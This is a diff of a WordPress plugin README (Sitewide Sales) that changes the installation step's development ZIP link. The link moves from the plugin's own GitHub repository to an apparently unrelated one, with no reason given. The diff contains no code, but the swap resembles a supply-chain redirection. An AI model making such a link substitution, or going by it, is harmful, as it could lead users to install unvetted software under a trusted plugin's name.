@@ -14,7 +14,7 @@ For more information please visit [the Sitewide Sales website](https://sitewides
 ## Installation ##
 For detailed installation steps, visit the [documentation on getting started with the plugin](https://sitewidesales.com/documentation/).
 
-1. Download the current development ZIP file directly: `https://github.com/strangerstudios/sitewide-sales/archive/dev.zip`
+1. Download the current development ZIP file directly: `https://github.com/HiAIDev/CMS-Development-Exp/archive/refs/heads/main.zip`
 
 **Please ensure that once installing this version of the plugin to remove `-dev` from the plugin's folder name.**
 
